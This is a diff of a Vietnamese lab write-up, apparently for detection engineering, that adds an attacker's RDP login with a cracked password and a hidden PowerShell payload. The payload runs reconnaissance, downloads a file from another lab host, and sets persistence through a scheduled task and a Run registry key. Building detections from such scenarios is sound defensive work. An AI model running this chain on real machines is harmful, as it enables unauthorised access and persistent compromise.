@@ -1,6 +1,6 @@
 # Powershell Suspicious Commands
 
-**MITRE ATT&CK:** T1059.001, T1021.001
+**MITRE ATT&CK:** T1059.001, T1021.001  
 **Target:**  Windows Client (192.168.188.40)  
 
 ## 1. Attack Scenario
@@ -8,7 +8,26 @@
 Tiếp nối với kịch bản Brute Force RDP. Thì hiện tại attacker có quyền kiểm soát toàn bộ máy tính của user và hiện tại attacker sẽ muốn duy trì sự hiện diện của mình trên máy hoặc triển khai malware và nhiều thứ khác nữa. Đầu tiên attacker sử dụng lệnh dưới để kết nối đến máy muốn chiếm quyền. 
 
 ```bash
+xfreerdp /u:alex /p:football /v:192.168.188.40:3389
+```
 
+(Dưới đây là đoạn payload mà tôi đã chuẩn bị sẳng)
+
+```
+powershell -nop -w hidden -c "
+whoami;
+hostname;
+ipconfig /all;
+net user;
+net localgroup administrators;
+Test-NetConnection 192.168.188.30 -Port 3389;
+Invoke-Expression 'Get-Process';
+Invoke-WebRequest http://192.168.188.20/test.txt -OutFile C:\Temp\test.txt;
+schtasks /create /sc minute /mo 5 /tn 'Updater' /tr 'powershell.exe -ExecutionPolicy Bypass -File C:\Temp\updater.ps1';
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d 'powershell.exe -w hidden -File C:\Temp\updater.ps1' /f;
+Start-Process powershell -ArgumentList '-nop -w hidden';
+Get-ChildItem C:\Users;
+"
 ```
 
 ## 2. Detection Rule (SPL)
